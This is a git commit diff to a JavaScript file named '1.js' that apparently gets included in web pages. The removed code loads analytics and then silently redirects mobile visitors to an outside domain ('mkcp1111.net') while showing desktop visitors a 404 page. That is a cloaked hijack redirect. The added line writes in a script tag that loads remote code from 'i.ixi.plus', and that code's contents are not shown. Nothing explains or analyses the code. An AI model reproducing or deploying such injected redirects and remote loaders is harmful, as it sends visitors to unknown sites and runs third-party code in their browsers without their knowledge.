614444be0b154933649efa5a662242a6bebc196f
dnshook <62766196+dnshook@users.noreply.github.com>
2024-10-27 03:23:34 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,13 +1,1 @@
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?c28dd79d9b6572056d73e250f1277607";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["http://mkcp1111.net", "http://mkcp1111.net"];
-	window.location.href = arr[parseInt(Math.random() * arr.length)];
-}else{
-	window.location.href="/404.html";
-}
+document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
